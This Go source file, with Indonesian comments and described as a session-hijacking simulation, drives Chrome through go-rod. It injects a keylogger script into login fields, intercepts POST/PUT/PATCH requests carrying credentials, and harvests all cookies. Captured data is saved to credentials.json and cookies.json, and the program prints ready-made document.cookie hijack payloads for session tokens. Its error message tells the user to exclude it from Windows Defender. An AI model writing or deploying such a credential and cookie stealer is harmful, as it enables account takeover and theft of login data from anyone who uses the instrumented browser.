package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
)

// CookieData struct untuk menyimpan data cookie untuk simulasi
type CookieData struct {
	Name     string  `json:"name"`
	Value    string  `json:"value"`
	Domain   string  `json:"domain"`
	Path     string  `json:"path"`
	HttpOnly bool    `json:"httpOnly"`
	Secure   bool    `json:"secure"`
	Expires  float64 `json:"expires"`
	Session  bool    `json:"session"`
}

// CredentialData untuk menyimpan data login yang disadap
type CredentialData struct {
	URL      string    `json:"url"`
	Type     string    `json:"type"` // "form-data", "json", atau "input-field"
	Data     string    `json:"data"`
	Time     time.Time `json:"time"`
}

func main() {
	path, ok := launcher.LookPath()
	if !ok {
		path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatalf("Gagal mendapatkan direktori user: %v", err)
	}
	
	// Secara otomatis menaruh data profil di C:\Users\Username\browsea-data
	userDataDir := filepath.Join(homeDir, "browsea-data")

	u, err := launcher.New().
		Bin(path).
		Headless(false).
		Leakless(false). // Mencegah pembuatan binary leakless di Temp yang dianggap malware
		UserDataDir(userDataDir). // Simpan data profile browser agar session login tidak hilang
		Set("start-maximized"). // Buka window secara ter-maximize sedari awal
		Launch()

	if err != nil {
		fmt.Printf("\n[!] Gagal menjalankan browser!\nError: %v\n", err)
		fmt.Println("\nJika Anda melihat error 'virus or potentially unwanted software', ini adalah efek dari Windows Defender/Antivirus yang memblokir simulasi session hijacking kita.")
		fmt.Println("Solusinya: Tambahkan folder project ini (atau file executable-nya) ke dalam daftar Exclusion/Pengecualian di Windows Security Anda.")
		return
	}

	// Inisialisasi browser
	// NoDefaultDevice() dipakai agar go-rod tidak mengecilkan isi web menjadi frame kotak 800x600
	browser := rod.New().ControlURL(u).NoDefaultDevice().MustConnect()
	defer browser.MustClose()

	// Tangkap signal Ctrl+C untuk close browser dengan bersih agar tidak menjadi zombie process
	// Ini penting karena jika program dihentikan dengan Leakless(false), chrome tidak otomatis tertutup
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("\n[!] Mematikan browser dan membersihkan session...")
		browser.MustClose()
		os.Exit(0)
	}()

	fmt.Println("Browser terbuka. Silakan interaksi / login ke aplikasi web target...")
	fmt.Println("Script ini akan memantau cookie untuk simulasi session hijacking.")
	fmt.Println("Tekan Ctrl+C untuk berhenti monitoring.")

	// Biarkan user mengetik sendiri atau melanjutkan session yang direstore otomatis oleh Chrome.
	// Kita ambil daftar tab yang aktif saat ini.
	pages, _ := browser.Pages()
	var page *rod.Page
	if len(pages) > 0 {
		page = pages[0]
	} else {
		// Fallback jika tidak ada tab sama sekali, buka tab kosong
		page = browser.MustPage("")
	}

	// Monitor input fields (seperti keylogger sederhana pada field password) untuk tab awal
	go monitorInputFields(page, homeDir)
	
	// Monitor network request POST untuk menangkap form submission di level browser (seluruh tab)
	go monitorNetworkRequests(browser, homeDir)

	// Monitor cookies secara berkala
	monitorCookies(browser, homeDir)
}

func monitorInputFields(page *rod.Page, homeDir string) {
	// Inject JavaScript untuk merekam input password dan username
	js := `
		() => {
			window.capturedCredentials = {};
			
			document.addEventListener('input', (e) => {
				const target = e.target;
				if (target.tagName === 'INPUT') {
					const type = target.type.toLowerCase();
					const name = target.name || target.id || 'unknown';
					
					// Rekam field password, email, text (username)
					if (type === 'password' || type === 'email' || type === 'text' || name.toLowerCase().includes('user') || name.toLowerCase().includes('login')) {
						window.capturedCredentials[name] = target.value;
					}
				}
			});

			document.addEventListener('submit', (e) => {
				// Saat form disubmit, kembalikan data yang tertangkap
				if (Object.keys(window.capturedCredentials).length > 0) {
					// Kita bisa kirim data ini lewat evaluasi dari Go
					e.target.setAttribute('data-captured', JSON.stringify(window.capturedCredentials));
				}
			});
		}
	`
	page.MustEvalOnNewDocument(js)
	
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		// Tarik data credential dari page
		res, err := page.Eval(`() => JSON.stringify(window.capturedCredentials || {})`)
		if err != nil {
			continue // Page mungkin sedang reload
		}
		
		val := res.Value.Str()
		if val != "{}" && val != "" {
			// Kita memiliki data ketikan
			// Jika ingin dilog langsung setiap ketik bisa di sini
			// Namun lebih efektif ditangkap saat netwok request (POST)
		}
	}
}

func monitorNetworkRequests(browser *rod.Browser, homeDir string) {
	router := browser.HijackRequests()
	defer router.MustStop()

	router.MustAdd("*", func(ctx *rod.Hijack) {
		req := ctx.Request
		httpReq := req.Req()
		
		// Deteksi request POST, PUT, atau PATCH yang biasa dipakai login
		method := httpReq.Method
		if method == "POST" || method == "PUT" || method == "PATCH" {
			urlStr := httpReq.URL.String()
			
			// Dapatkan payload POST/PUT
			postData := req.Body()
			
			if postData != "" {
				// Deteksi keyword yang berhubungan dengan login/auth
				lowerData := strings.ToLower(postData)
				if strings.Contains(lowerData, "password") || 
				   strings.Contains(lowerData, "pass") || 
				   strings.Contains(lowerData, "user") || 
				   strings.Contains(lowerData, "email") ||
				   strings.Contains(lowerData, "login") ||
				   strings.Contains(lowerData, "auth") {
					
					fmt.Printf("\n[!] Potensi Data Login Tersadap (Request POST ke %s)!\n", truncateString(urlStr, 50))
					
					cred := CredentialData{
						URL:  urlStr,
						Type: "network-request",
						Data: postData,
						Time: time.Now(),
					}
					
					// Tentukan tipe data
					if strings.HasPrefix(postData, "{") {
						cred.Type = "json"
						fmt.Printf("   >>> [JSON] %s\n", truncateString(postData, 100))
					} else {
						cred.Type = "form-data"
						fmt.Printf("   >>> [FORM] %s\n", truncateString(postData, 100))
					}
					
					// Load existing credits and append
					credFile := filepath.Join(homeDir, "browsea-data", "credentials.json")
					
					var existingCreds []CredentialData
					fileData, err := os.ReadFile(credFile)
					if err == nil {
						json.Unmarshal(fileData, &existingCreds)
					}
					
					// Hanya tambahkan jika datanya belum ada di daftar untuk mencegah duplikat berlebih
					isNew := true
					for _, c := range existingCreds {
						if c.Data == cred.Data && time.Since(c.Time) < 5*time.Second {
							isNew = false // Hindari duplicate log dalam rentang 5 detik yang sama (misal ada retry dari browser)
							break
						}
					}
					
					if isNew {
						existingCreds = append(existingCreds, cred)
						saveToJSON(existingCreds, credFile)
					}
				}
			}
		}
		
		// Lanjutkan request secara normal
		ctx.ContinueRequest(&proto.FetchContinueRequest{})
	})
	
	go router.Run()
}

func monitorCookies(browser *rod.Browser, homeDir string) {
	ticker := time.NewTicker(3 * time.Second) // Cek setiap 3 detik
	defer ticker.Stop()

	var previousCookiesStr string

	for range ticker.C {
		// Dapatkan semua halaman
		pages, err := browser.Pages()
		if err != nil || len(pages) == 0 {
			continue
		}

		// Kita monitor cookie di halaman aktif yang pertama
		page := pages[0]
		
		// Mengambil semua cookies untuk URL yang ada di halaman tersebut
		cookies, err := page.Cookies([]string{})
		if err != nil {
			log.Printf("Error mendapatkan cookies: %v", err)
			continue
		}

		if len(cookies) > 0 {
			currentCookiesJSON, _ := json.Marshal(cookies)
			currentCookiesStr := string(currentCookiesJSON)

			// Jika ada perubahan cookie
			if currentCookiesStr != previousCookiesStr {
				fmt.Println("\n[!] Cookie Baru / Perubahan Session Terdeteksi!")
				
				var cookieDataList []CookieData
				for _, c := range cookies {
					cookieDataList = append(cookieDataList, CookieData{
						Name:     c.Name,
						Value:    c.Value,
						Domain:   c.Domain,
						Path:     c.Path,
						HttpOnly: c.HTTPOnly,
						Secure:   c.Secure,
						Expires:  float64(c.Expires),
						Session:  c.Session,
					})
					
					// Highlight cookie yang rentan atau menarik
					warning := ""
					if !c.HTTPOnly {
						warning += " [HTTPOnly=false]"
					}
					if !c.Secure {
						warning += " [Secure=false]"
					}
					
					// Jangan print value terlalu panjang
					fmt.Printf("- %s = %s... %s\n", c.Name, truncateString(c.Value, 40), warning)

					nameLower := strings.ToLower(c.Name)
					if strings.Contains(nameLower, "sess") || strings.Contains(nameLower, "auth") || strings.Contains(nameLower, "token") || strings.Contains(nameLower, "id") {
						fmt.Printf("   >>> MUNGKIN TARGET: Session / Token: %s\n", c.Name)
						fmt.Printf("   >>> PAYLOAD HIJACK: document.cookie=\"%s=%s; domain=%s; path=%s\";\n", c.Name, c.Value, c.Domain, c.Path)
					}
				}

				// Simpan ke file log JSON di direktori data profile
				cookieFilePath := filepath.Join(homeDir, "browsea-data", "cookies.json")
				saveToJSON(cookieDataList, cookieFilePath)
				
				previousCookiesStr = currentCookiesStr
			}
		}
	}
}

func truncateString(str string, length int) string {
	if len(str) <= length {
		return str
	}
	return str[:length]
}

func saveToJSON(data interface{}, filename string) error {
	jsonData, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return err
	}

	fmt.Printf("\n[+] Data tersimpan ke %s\n", filename)
	return os.WriteFile(filename, jsonData, 0644)
}
